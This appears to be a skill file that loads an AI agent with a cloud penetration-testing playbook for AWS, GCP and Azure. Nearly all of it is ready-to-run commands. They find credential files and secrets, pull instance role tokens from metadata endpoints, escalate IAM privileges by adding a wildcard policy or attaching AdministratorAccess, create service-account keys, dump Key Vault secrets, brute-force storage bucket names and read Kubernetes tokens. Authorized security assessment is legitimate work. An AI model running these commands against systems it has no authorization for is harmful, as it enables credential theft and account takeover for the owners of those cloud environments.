---
name: tech-cloud-security
description: "Cloud security assessment skill for AWS, GCP, and Azure. Tests IMDS abuse, IAM privilege escalation, misconfigured storage, exposed credentials, serverless security, and container escapes. Triggers: 'cloud security', 'aws pentest', 'gcp pentest', 'azure pentest', 'cloud assessment', 'iam privilege escalation', 's3 bucket', 'cloud credentials', 'cloud misconfiguration', 'imds abuse'."
---

# Cloud Security Assessment

"Cloud pentesting is 80% authorization abuse and credential chaining." Find credentials → map permissions → identify escalation paths.

## Phase 1: Credential Discovery

```bash
# Check for exposed credentials in target environment
# AWS credential files
find / -name "credentials" -path "*/.aws/*" 2>/dev/null
find / -name ".env" -o -name "*.env" 2>/dev/null | xargs grep -l "AWS_" 2>/dev/null

# Environment variables
env | grep -E "AWS|GCP|AZURE|GOOGLE|SECRET|KEY|TOKEN"

# IMDS (from compromised EC2/GCP/Azure host)
# AWS IMDSv1
curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/
# Then:
curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/<role_name>

# AWS IMDSv2
TOKEN=$(curl -s -X PUT "http://169.254.169.254/latest/api/token" \
  -H "X-aws-ec2-metadata-token-ttl-seconds: 21600")
curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/ \
  -H "X-aws-ec2-metadata-token: $TOKEN"

# GCP metadata
curl -s "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token" \
  -H "Metadata-Flavor: Google"
curl -s "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/" \
  -H "Metadata-Flavor: Google"

# Azure MSI
curl -s "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/" \
  -H "Metadata: true"
```

## Phase 2: AWS Assessment

```bash
# Configure credentials
export AWS_ACCESS_KEY_ID=<key>
export AWS_SECRET_ACCESS_KEY=<secret>
export AWS_SESSION_TOKEN=<token>  # If temporary creds

# Identity check
aws sts get-caller-identity

# Enumerate permissions (what can I do?)
# ScoutSuite (comprehensive)
scout aws --region us-east-1 --no-browser --report-dir ./scout_results

# Prowler (CIS benchmark checks)
prowler aws --output-directory ./prowler_results

# Manual IAM enum
aws iam get-user
aws iam list-attached-user-policies --user-name <user>
aws iam list-user-policies --user-name <user>
aws iam get-policy --policy-arn <arn>
aws iam get-policy-version --policy-arn <arn> --version-id v1

# List accessible services
for service in s3 ec2 iam lambda rds ecs eks sqs sns; do
  echo "=== $service ===" && aws $service help 2>/dev/null | head -3
done

# S3 bucket enumeration
aws s3 ls  # List all buckets
aws s3 ls s3://<bucket-name>  # List bucket contents
aws s3 cp s3://<bucket-name>/<file> /tmp/  # Download file

# Public bucket scanner
python3 s3scanner.py -f company_names.txt --include-closed

# EC2 instances
aws ec2 describe-instances --query 'Reservations[].Instances[].[InstanceId,PublicIpAddress,PrivateIpAddress,State.Name]' --output table

# Lambda functions
aws lambda list-functions --query 'Functions[].[FunctionName,Runtime,Role]' --output table
aws lambda get-function --function-name <name>  # May contain env vars with secrets
```

## Phase 3: AWS IAM Privilege Escalation

```bash
# Pacu (automated AWS privesc)
python3 pacu.py
# In Pacu:
# run iam__enum_permissions
# run iam__privesc_scan

# Manual privesc vectors
# 1. Create new policy version (if iam:CreatePolicyVersion)
aws iam create-policy-version --policy-arn <arn> \
  --policy-document '{"Version":"2012-10-17","Statement":[{"Effect":"Allow","Action":"*","Resource":"*"}]}' \
  --set-as-default

# 2. Attach admin policy (if iam:AttachUserPolicy)
aws iam attach-user-policy --user-name <own_user> \
  --policy-arn arn:aws:iam::aws:policy/AdministratorAccess

# 3. Lambda with elevated role (if iam:PassRole + lambda:CreateFunction)
aws lambda create-function \
  --function-name priv-esc \
  --runtime python3.9 \
  --role arn:aws:iam::<account>:role/<elevated_role> \
  --handler lambda_function.lambda_handler \
  --zip-file fileb://function.zip

# 4. Assume role chain
aws sts assume-role --role-arn arn:aws:iam::<account>:role/<target_role> \
  --role-session-name pentest-session

# CloudSplaining (policy analysis)
cloudplaining download --profile default
cloudplaining analyze --input-directory account-authorization-details.json.gz
```

## Phase 4: GCP Assessment

```bash
# Identity
gcloud auth activate-service-account --key-file=credentials.json
gcloud auth print-access-token | TOKEN=$(cat) gcloud projects list

# Enumerate permissions
gcloud projects get-iam-policy <project_id>
gcloud iam service-accounts list
gcloud iam service-accounts get-iam-policy <sa_email>

# Storage
gsutil ls gs://  # List all accessible buckets
gsutil ls -la gs://<bucket>/
gsutil cat gs://<bucket>/<file>

# ScoutSuite for GCP
scout gcp --report-dir ./scout_gcp

# GCP privesc — service account key creation
gcloud iam service-accounts keys create /tmp/key.json \
  --iam-account=<elevated_sa>@<project>.iam.gserviceaccount.com
```

## Phase 5: Azure Assessment

```bash
# Authentication
az login --service-principal -u <client_id> -p <client_secret> --tenant <tenant_id>

# Identity
az account show

# Enumerate resources
az resource list --output table

# Role assignments
az role assignment list --all --output table
az ad user list --output table

# Storage accounts
az storage account list --output table
az storage container list --account-name <name> --output table

# Key Vaults
az keyvault list --output table
az keyvault secret list --vault-name <vault_name>
az keyvault secret show --vault-name <vault_name> --name <secret_name>

# ScoutSuite for Azure
scout azure --report-dir ./scout_azure
```

## Phase 6: Misconfigured Storage

```bash
# AWS S3 public access test
curl -s https://<bucket>.s3.amazonaws.com/ | grep -i "ListBucketResult\|Access Denied\|NoSuchBucket"

# S3 bucket name bruteforce
for name in $(cat company_names.txt); do
  for suffix in '' '-dev' '-prod' '-staging' '-backup' '-data' '-logs'; do
    bucket="${name}${suffix}"
    status=$(curl -s -o /dev/null -w "%{http_code}" "https://$bucket.s3.amazonaws.com/")
    [ "$status" = "200" ] && echo "PUBLIC: $bucket"
    [ "$status" = "403" ] && echo "EXISTS (private): $bucket"
  done
done

# GCS public bucket
curl -s "https://storage.googleapis.com/<bucket-name>/"

# Azure blob
curl -s "https://<account>.blob.core.windows.net/<container>?restype=container&comp=list"
```

## Phase 7: Serverless & Container

```bash
# Lambda environment variables (potential secrets)
aws lambda get-function-configuration --function-name <name> | jq '.Environment.Variables'

# ECS task metadata
curl -s http://169.254.170.2/v2/metadata  # ECS metadata endpoint
curl -s "$AWS_CONTAINER_CREDENTIALS_RELATIVE_URI"  # Container credentials

# EKS - use service account token
kubectl get pods --all-namespaces
kubectl exec -it <pod> -- cat /var/run/secrets/kubernetes.io/serviceaccount/token

# ECR image pull (look for hardcoded secrets)
aws ecr get-login-password | docker login --username AWS \
  --password-stdin <account>.dkr.ecr.<region>.amazonaws.com
docker pull <account>.dkr.ecr.<region>.amazonaws.com/<repo>:latest
docker history --no-trunc <image>  # Check build history
```

## Validation (REQUIRED before reporting)

Document:
1. Account ID / Project ID / Subscription ID
2. Identity (user/role/service account) and its permissions
3. Each misconfiguration: finding, evidence, blast radius
4. Escalation chain: initial access → intermediate steps → final privilege

For storage: show exact file/bucket/key accessed. For IAM: show exact policy document granting excessive permissions.
